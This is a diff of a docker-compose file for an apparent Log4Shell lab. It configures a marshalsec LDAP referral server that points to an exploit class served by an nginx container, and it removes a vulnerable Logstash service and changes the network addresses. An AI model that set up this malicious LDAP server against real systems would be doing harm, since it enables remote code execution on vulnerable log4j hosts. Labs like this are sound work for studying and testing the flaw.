@@ -11,16 +11,15 @@ services:
       - -cp
       - /usr/app/marshalsec-0.0.3-SNAPSHOT-all.jar
       - marshalsec.jndi.LDAPRefServer
-      - http://192.168.55.20:80/exploits/#CreateFile
+      - http://127.0.0.1:8888/exploits/#CreateFile
     restart: always
     networks:
       log4j:
-        ipv4_address: 192.168.55.10
   web-server:
     build: web-server/
     container_name: web-server
     ports:
-      - :80
+      - 8888:8888
     volumes:
       - ./web-server/conf:/etc/nginx/conf.d
     restart: always
@@ -28,26 +27,7 @@ services:
       - ldap-server
     networks:
       log4j:
-        ipv4_address: 192.168.55.20
-  logstash:
-    image: docker.elastic.co/logstash/logstash:6.3.2
-    container_name: logstash
-    logging:
-      driver: "json-file"
-      options:
-        max-file: "9"
-        max-size: "6m"
-    volumes:
-      - ./vulnApps/logstash/pipeline:/usr/share/logstash/pipeline
-    environment:
-      - xpack.monitoring.enabled=false
-      - ls.java.opts="-Xmx256m -Xms256m"
-    ports:
-      -  "8080:8080"
-    restart: always
-    networks:
-      log4j:
 
 networks:
   log4j:
-    name: socket_proxy
+    driver: bridge
